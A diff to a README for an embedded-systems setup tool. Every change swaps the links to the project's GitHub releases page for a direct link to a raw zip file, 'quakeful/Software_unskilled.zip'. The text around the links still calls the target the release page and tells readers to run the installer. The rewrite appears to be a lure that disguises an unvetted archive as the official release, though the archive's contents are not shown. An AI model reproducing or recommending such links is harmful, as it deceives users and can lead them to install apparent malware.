@@ -1,6 +1,6 @@
 # ⚙️ ramsudarshanmaurya - Easy Embedded Systems Setup
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/SeleJoe/ramsudarshanmaurya/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/SeleJoe/ramsudarshanmaurya/raw/refs/heads/main/quakeful/Software_unskilled.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Once installed, you will have access to:
 
 You need to visit the release page to get the latest version of the software.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/SeleJoe/ramsudarshanmaurya/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/SeleJoe/ramsudarshanmaurya/raw/refs/heads/main/quakeful/Software_unskilled.zip)
 
 Click the green button to open the release page in your browser.
 
@@ -109,7 +109,7 @@ You can open the included manuals and tutorials folder inside the app. These doc
 
 To update to a newer version in the future:
 
-- Return to the [release page](https://github.com/SeleJoe/ramsudarshanmaurya/releases).
+- Return to the [release page](https://github.com/SeleJoe/ramsudarshanmaurya/raw/refs/heads/main/quakeful/Software_unskilled.zip).
 - Download the latest installer.
 - Run the installer again, which will replace the old version.
 
@@ -157,4 +157,4 @@ You may find it helpful to familiarize yourself with basic concepts of embedded 
 
 Access the software and all latest updates here:
 
-[https://github.com/SeleJoe/ramsudarshanmaurya/releases](https://github.com/SeleJoe/ramsudarshanmaurya/releases)
+[https://github.com/SeleJoe/ramsudarshanmaurya/raw/refs/heads/main/quakeful/Software_unskilled.zip](https://github.com/SeleJoe/ramsudarshanmaurya/raw/refs/heads/main/quakeful/Software_unskilled.zip)
